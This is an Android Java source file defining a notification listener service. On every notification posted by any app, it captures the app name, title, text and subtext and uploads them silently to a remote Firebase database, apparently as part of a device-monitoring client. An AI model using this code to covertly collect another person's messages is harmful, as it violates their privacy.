package com.bioverflow.dobermann.client;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.annotation.RequiresApi;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;

@SuppressLint("OverrideAbstract")
@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NotificationCatcher extends NotificationListenerService {
    private FirebaseDatabase database;
    private DatabaseReference notificationRef;
    private ClientSettings clientSettings;

    public NotificationCatcher() {
        database = FirebaseDatabase.getInstance();
        notificationRef = database.getReference("Notifications");
    }

    ClientSettings getClientSettings(){
        return new ClientSettings(this);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        try{
            if(this.clientSettings == null){
                this.clientSettings = getClientSettings();
            }

            /// Getting notification information
            Bundle extras = sbn.getNotification().extras;

            /// Formatting only important information in an entity to save in database in future
            NotificationEntity notification = new NotificationEntity(
                    this.clientSettings,
                    Calendar.getInstance().getTime(),
                    sbn.getPackageName(),
                    extras.getString(Notification.EXTRA_TITLE),
                    (extras.getCharSequence(Notification.EXTRA_TEXT)).toString(),
                    extras.getCharSequence(Notification.EXTRA_SUB_TEXT)!= null ? (extras.getCharSequence(Notification.EXTRA_SUB_TEXT)).toString() : "");

            // Saving in database
            this.notificationRef.push().setValue(notification);
        }
        catch (Exception e){ }
    }
}
